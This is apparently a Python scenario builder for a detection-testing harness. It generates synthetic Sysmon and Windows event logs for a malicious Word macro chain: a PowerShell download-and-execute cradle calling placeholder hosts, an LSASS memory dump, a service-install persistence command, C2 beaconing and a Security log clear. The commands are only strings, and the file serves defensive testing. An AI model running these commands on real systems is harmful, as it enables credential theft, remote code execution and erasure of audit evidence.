"""storyline_endpoint_macro_c2 -- a malicious Word macro on one workstation, followed down its Sysmon
process tree: Outlook -> Word -> PowerShell, then a script-block cradle, an LSASS memory read by a
dropped dumper, a service installed for the dropped implant, the implant's periodic C2 beacon, and
finally the Security log cleared.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    macro_shell -> ps_cradle -> lsass_read -> service_persistence -> c2_beacon -> log_clear

WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7)
    * every step raises an alert on its own rule, so each oracle pair has a timed alert on both sides
      (ADR-011 F3); the forbidden pairs are the anti-causal reversals of allowed ones, which the
      entity track joins in both directions, so they reach distinct timed edges of one graph (F4);
    * the Sysmon records carry REAL process-tree keys written by this builder's own generator
      (``sysmon_tree``): EID 1 ``ProcessGuid`` / ``ParentProcessGuid``, EID 3 ``ProcessGuid``, EID 10
      ``SourceProcessGUID``. The oracle's ``causal_links`` are derived from those raw records by
      ``sysmon_tree.derive_links`` (no parser, rule, alert or service code), and the test pins them.

PROCESS TREE (one workstation; ``P`` = the PowerShell the macro starts)

        explorer -> outlook -> winword -> P ----+--> whoami                  (step ps_cradle)
                                                +--> procdump  --EID10--> lsass   (step lsass_read)
                                                +--> sc.exe / updater.exe    (step service_persistence)
                                                |        updater.exe --EID3 x N--> C2  (step c2_beacon)
                                                +--> wevtutil                (step log_clear)

TELEMETRY. Real parsers: ``sysmon`` (EID 1, 3, 10) and ``windows_eventlog`` (4104, 7045, 1102). No
dependency gaps (``parse_expected=True`` everywhere). A step may mix the two sources: its helper
process-creation records are Sysmon, its alert-raising record is whichever source the step names.

STRUCTURE VARIES WITH THE SEED: account, workstation, addresses, number of script-block events (1-3),
number of beacon connections (20-24), the dropped tool names and the C2 address.

SAFETY. Simulation only: ``.invalid`` / documentation addresses, private 10.0.0.0/8 source addresses, a
fixed calendar epoch, no wall clock. Command lines are strings inside log records; nothing runs.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, ScenarioDef  # noqa: E402
from scenario_kit import BASE_MS  # noqa: E402
from sysmon_tree import Emitter, Host  # noqa: E402

TAG = "emc"

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("macro_shell", "sysmon", True,
                  "Outlook opens a document; Word's macro starts a PowerShell (document host spawns a shell)"),
    ChainStepSpec("ps_cradle", "windows_eventlog", True,
                  "script-block logging records a download-and-execute cradle in that PowerShell"),
    ChainStepSpec("lsass_read", "sysmon", True,
                  "a dropped dumper started by the PowerShell opens lsass.exe with a memory-read mask"),
    ChainStepSpec("service_persistence", "windows_eventlog", True,
                  "a service is installed for the dropped implant from a user-writable path"),
    ChainStepSpec("c2_beacon", "sysmon", True,
                  "the implant process makes regular-interval outbound connections"),
    ChainStepSpec("log_clear", "windows_eventlog", True,
                  "the Security event log is cleared"),
)
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_deploy_script", "windows_eventlog", True,
                  "a deployment service account runs a download-and-execute script on a build host (BENIGN)"),
)

_ACCOUNTS = ("a.finance", "m.sales", "k.legal", "t.procure")
_WKS = ("wks-fin-21", "wks-sal-08", "wks-leg-12", "wks-pro-30")
_DROPPERS = ("procdump64.exe", "sqldmp.exe", "taskhelp.exe")
_IMPLANTS = ("updater.exe", "msedgeupd.exe", "vmtoolsd32.exe")
_C2 = ("198.51.100.23", "203.0.113.77", "198.51.100.140")
_CRADLES = (
    "IEX (New-Object Net.WebClient).DownloadString('http://stage.example.invalid/a.ps1')",
    "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://x.example.invalid/p'))",
)
_PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
_SYS = "C:\\Windows\\System32\\"
_OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"


def _rule_id(stem: str) -> str:
    """A rule's id read from its own file (the twins name a rule by stem, never by a copied id)."""
    import yaml  # noqa: PLC0415
    path = TWIN.parents[1] / "contracts" / "rules" / f"{stem}.yml"
    return str(yaml.safe_load(path.read_text(encoding="utf-8"))["id"])


def build(seed: int):
    rng = Random(seed * 1299721 + 41)
    user = rng.choice(_ACCOUNTS)
    wks = rng.choice(_WKS)
    ip = f"10.41.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    dropper = rng.choice(_DROPPERS)
    implant_name = rng.choice(_IMPLANTS)
    c2 = rng.choice(_C2)
    cradle = rng.choice(_CRADLES)
    n_ps = 1 + seed % 3                       # 1..3 script-block events
    n_beats = 20 + seed % 5                   # 20..24 beacon connections (rule threshold is 20)
    svc_name = f"UpdSvc{rng.randint(10, 99)}"
    implant_path = f"C:\\Users\\Public\\{implant_name}"
    dropper_path = f"C:\\Users\\Public\\{dropper}"

    host = Host(wks, ip, seed)
    em = Emitter(seed, TAG, STEPS)
    notes: dict = {}

    def add(label: str, source_type: str, raw: dict, ts: int) -> None:
        em.add(label, source_type, raw, ts, ip)

    t0 = BASE_MS
    # ---- process tree (the builder decides the processes; every record below is derived from it) ----
    explorer = host.proc("C:\\Windows\\explorer.exe", "explorer.exe", user, t0 - 1_000)
    outlook = host.proc(_OFFICE + "OUTLOOK.EXE", "\"OUTLOOK.EXE\"", user, t0, explorer)
    word = host.proc(_OFFICE + "WINWORD.EXE", "\"WINWORD.EXE\" /n C:\\Users\\Public\\Invoice.docm", user, t0 + 4_000, outlook)
    ps = host.proc(_SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -nop -w hidden", user, t0 + 9_000, word)
    recon = [host.proc(_SYS + exe, cmd, user, t0 + 16_000 + i * 1_000, ps) for i, (exe, cmd) in enumerate((
        ("whoami.exe", "whoami /all"), ("hostname.exe", "hostname"), ("ipconfig.exe", "ipconfig /all"),
        ("net.exe", "net user /domain")))]
    t_ps = t0 + 30_000
    dumper = host.proc(dropper_path, f"{dropper} -ma lsass.exe", user, t_ps + 60_000, ps)
    lsass = host.proc(_SYS + "lsass.exe", "lsass.exe", "SYSTEM", t0 - 7_200_000)
    sc = host.proc(_SYS + "sc.exe", f"sc.exe create {svc_name} binPath= {implant_path}", user, t_ps + 200_000, ps)
    implant = host.proc(implant_path, implant_path, user, t_ps + 215_000, ps)
    wevt = host.proc(_SYS + "wevtutil.exe", "wevtutil.exe cl Security", user, t_ps + 880_000, ps)

    # ---- step macro_shell: Outlook -> Word -> PowerShell; only the last creation raises the alert ----
    for p in (explorer, outlook, word, ps):
        add("macro_shell", "sysmon", p.create_record(), p.start_ms)
    notes["macro_shell"] = f"{user} on {wks}: OUTLOOK -> WINWORD -> powershell.exe"

    # ---- step ps_cradle: four recon children of the PowerShell, then the script-block events ----
    for p in recon:
        add("ps_cradle", "sysmon", p.create_record(), p.start_ms)
    for i in range(n_ps):
        ts = t_ps + i * 15_000
        add("ps_cradle", "windows_eventlog",
            {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
             "Computer": wks, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "ScriptBlockText": cradle, "TimeCreated": ts}, ts)
    notes["ps_cradle"] = f"{n_ps} script-block event(s) on {wks}: {cradle[:44]}..."

    # ---- step lsass_read: the PowerShell drops a dumper, the dumper reads lsass ----
    add("lsass_read", "sysmon", dumper.create_record(), dumper.start_ms)
    t_acc = dumper.start_ms + 5_000
    add("lsass_read", "sysmon", dumper.access_record(t_acc, lsass.image, lsass.guid, lsass.pid, "0x1010"), t_acc)
    notes["lsass_read"] = f"{dropper_path} opens lsass.exe with GrantedAccess 0x1010"

    # ---- step service_persistence: sc.exe registers the dropped implant, which the PowerShell also starts ----
    add("service_persistence", "sysmon", sc.create_record(), sc.start_ms)
    add("service_persistence", "sysmon", implant.create_record(), implant.start_ms)
    t_svc = sc.start_ms + 5_000
    add("service_persistence", "windows_eventlog",
        {"EventID": 7045, "Channel": "System", "ProviderName": "Service Control Manager",
         "Computer": wks, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "ServiceName": svc_name, "ImagePath": implant_path, "TimeCreated": t_svc}, t_svc)
    notes["service_persistence"] = f"{svc_name} -> {implant_path} on {wks}"

    # ---- step c2_beacon: the implant process connects out at a regular interval ----
    t_b = implant.start_ms + 60_000
    for i in range(n_beats):
        ts = t_b + i * 15_000 + (rng.randint(-500, 500) if i else 0)
        add("c2_beacon", "sysmon", implant.connect_record(ts, c2, 443, 49_200 + i), ts)
    notes["c2_beacon"] = f"{n_beats} connections from {implant_name} to {c2}:443 every ~15 s"

    # ---- step log_clear ----
    add("log_clear", "sysmon", wevt.create_record(), wevt.start_ms)
    t_clr = wevt.start_ms + 3_000
    add("log_clear", "windows_eventlog",
        {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
         "Computer": wks, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TimeCreated": t_clr}, t_clr)
    notes["log_clear"] = f"{user} clears the Security log on {wks}"
    return em.payloads, {}, notes, None


def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    em = Emitter(seed, TAG + "d", DECOY_STEPS)
    for i in range(2):
        ts = BASE_MS + 30_000 + i * 25_000
        em.add(spec.label, "windows_eventlog",
               {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
                "Computer": "build03", "SubjectUserName": "deploy.svc", "SubjectDomainName": "CORP",
                "ScriptBlockText": "(New-Object Net.WebClient).DownloadString("
                                   "'https://pkg.internal.example/agent.ps1') | IEX",
                "TimeCreated": ts}, ts, "10.42.0.4")
    return em.payloads


STORYLINE = ScenarioDef(
    name="endpoint_macro_c2",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_endpoint_macro_c2.yaml",
    summary="Outlook -> Word -> PowerShell on one workstation (Sysmon process tree), cradle, LSASS read by a "
            "dropped dumper, service for the implant, regular C2 beacon, Security log cleared",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS,
)
